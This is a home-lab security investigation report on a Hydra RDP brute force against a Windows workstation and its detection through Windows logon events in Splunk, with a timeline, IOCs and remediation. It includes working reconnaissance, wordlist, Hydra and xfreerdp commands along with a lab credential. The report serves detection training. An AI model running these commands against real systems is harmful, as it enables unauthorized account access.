# Investigation 03: RDP Brute Force and Successful Login Against HR-PC01

| Field | Value |
|---|---|
| Date | 2026-09-27 |
| Attacker Host | attack01 (Kali Linux, 192.168.10.70) |
| Target Host | HR-PC01 (192.168.10.100) |
| Target Account | `hruser` (ASHAG\hruser) |
| MITRE ATT&CK Technique | T1110 — Brute Force / T1021.001 — Remote Services: Remote Desktop Protocol |
| Severity (assessed) | High (valid domain credentials obtained, interactive RDP session established) |
| Status | Investigated / Closed |

## 1. Scenario

Third investigation in the low-to-high complexity progression, continuing the attack chain from Investigation 02. Having demonstrated credential access via SSH brute force against `web01`, the attacker targets the internal Windows environment — specifically `HR-PC01` — attempting to brute-force the `hruser` account over RDP and establish an interactive session.

## 2. Pre-Attack Reconnaissance

Before launching the brute force, the attacker confirmed RDP was reachable:

```bash
# Ping confirmed host was alive
ping 192.168.10.100

# Nmap confirmed port 3389 open
nmap -p 3389 192.168.10.100
```

RDP was enabled on HR-PC01 with Network Level Authentication (NLA) active — a hardening control that requires credentials before a full RDP session is established. NLA was handled correctly by Hydra's RDP module via `xfreerdp`.

## 3. Attack Execution

**Wordlist preparation — targeted list to demonstrate the technique within a controlled lab timeframe:**

```bash
set +H
head -50 /usr/share/wordlists/rockyou.txt > /tmp/targeted-list.txt
echo 'Aa1111!' >> /tmp/targeted-list.txt
```

A scoped 51-entry wordlist was used rather than the full rockyou.txt. This is a documented lab condition: `hruser`'s password was intentionally set to a complexity-compliant but weak credential (`Aa1111!`) to demonstrate the full compromise chain within a reasonable timeframe. This reflects real-world attack scenarios where password audits or previous breaches give attackers a targeted candidate list rather than a blind full-dictionary run.

**Brute force command:**
```bash
hydra -l hruser -P /tmp/targeted-list.txt -t 1 -W 5 rdp://192.168.10.100
```

**Hydra output (key lines):**
```
[DATA] attacking rdp://192.168.10.100:3389/
[3389][rdp] host: 192.168.10.100  login: hruser  password: Aa1111!
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2026-09-27 12:47:03
```

**RDP session established using discovered credentials:**
```bash
xfreerdp /u:hruser /p:'Aa1111!' /v:192.168.10.100
```

An interactive RDP desktop session opened successfully as `ASHAG\hruser`.

## 4. Detection

```spl
index="windows" host="HR-PC01" source="XmlWinEventLog:Security" EventCode=4625 OR EventCode=4624 IpAddress=192.168.10.70
| table _time host EventCode TargetUserName IpAddress LogonType
| sort - _time
```

**Results: 55 events total from 192.168.10.70 against hruser**

| EventCode | LogonType | Meaning | Count |
|---|---|---|---|
| 4625 | 3 | Failed network logon (brute force attempts) | ~50 |
| 4624 | 3 | Successful network logon associated with the authentication attempts; occurred before the successful RDP session | 4 |
| 4624 | 10 | Successful RemoteInteractive logon (RDP session) | 1 |

**The LogonType 10 event at 07:24:56 is the definitive indicator** — LogonType 10 (`RemoteInteractive`) means an interactive RDP session was established, distinct from LogonType 3 network authentication. The progression is visible in a single search: a burst of 4625 failures followed by 4624 successes culminating in the LogonType 10 RDP session.

**Key event codes for this technique:**
- **4625** — Failed logon events corresponding to the observed RDP authentication attempts; timing, source IP (`192.168.10.70`), and target account (`hruser`) are consistent with the Hydra activity generated from attack01
- **4624 LogonType 3** — Successful network logon associated with the authentication attempts; occurred before the successful RDP session
- **4624 LogonType 10** — Successful RemoteInteractive: actual RDP desktop session opened

## 5. Investigation Timeline

**Note on timestamps:** Hydra output timestamps are in local time (IST, UTC+5:30); Splunk event timestamps are displayed in UTC. The Splunk events at 07:17–07:24 UTC correspond to 12:47–12:54 IST local time, consistent with the Hydra run that finished at 12:47:03 local time.

| Time (UTC) | Event | Source |
|---|---|---|
| 07:17:00 | Failed logon events (4625, LogonType 3) begin appearing from 192.168.10.70 against hruser | HR-PC01 Security log |
| 07:17:02 | First successful network logon (4624, LogonType 3) associated with authentication attempts | HR-PC01 Security log |
| 07:24:56 | Successful RemoteInteractive logon (4624, LogonType 10) — RDP session opened via xfreerdp | HR-PC01 Security log |

## 6. Indicators of Compromise (IOCs)

- Source IP: `192.168.10.70` (attack01)
- Target host: `192.168.10.100` (HR-PC01)
- Target account: `ASHAG\hruser`
- Destination port: `3389` (RDP)
- LogonType 10 from an unexpected source IP — primary alert indicator
- Burst of 4625 events immediately preceding the 4624 — brute force pattern

## 7. Response & Remediation

**Lab response:**
- Terminate the active RDP session
- Reset `hruser` password
- Block `192.168.10.70` at host firewall on HR-PC01

**Production considerations:**
- Restrict RDP access to authorized management/jump hosts only — direct RDP exposure across the full internal segment is unnecessary and increases attack surface
- Review and enforce an account lockout policy: no effective lockout threshold prevented repeated authentication attempts against `hruser` during this investigation (covered specifically in Investigation 05 — Password Spray → Account Lockout)
- Consider deploying an RDP gateway rather than exposing port 3389 directly on workstations

## 8. Lessons Learned / Detection Gaps

- **LogonType is critical context for 4624 events.** A successful logon (4624) is not inherently suspicious — domain-joined workstations generate them constantly for legitimate activity. LogonType 10 (RemoteInteractive) from an unexpected source IP is the specific indicator that separates a normal logon from an RDP compromise. Without the LogonType field, this event would blend into normal logon noise.
- **No effective account lockout threshold prevented repeated authentication attempts against `hruser`.** This is the most significant gap identified in this investigation — the exact lockout policy recommendation will be tested and documented specifically in Investigation 05 (Password Spray → Account Lockout).
- **NLA was enabled but insufficient alone.** Network Level Authentication required valid credentials before session establishment — a good control — but it doesn't rate-limit or block repeated failed authentication attempts, so it couldn't prevent the brute force from succeeding once the correct password was tried.
- **Brute force is clearly visible in Security event logs.** Unlike Investigation 01 (where Sysmon's config design left a detection gap), the Windows Security log captured every failed and successful logon event for this technique without any additional configuration needed — EventCode 4625 and 4624 are logged by default.

## Evidence

- [hydra-rdp-output.txt](../evidence/03-rdp-bruteforce-hr-pc01/hydra-rdp-output.txt) — full Hydra output showing password found
- [rdp-session-screenshot.png](../evidence/03-rdp-bruteforce-hr-pc01/rdp-session-screenshot.png) — successful RDP desktop session as hruser
- [splunk-detection-results.png](../evidence/03-rdp-bruteforce-hr-pc01/splunk-detection-results.png) — 55 events showing brute force pattern + LogonType 10 RDP session
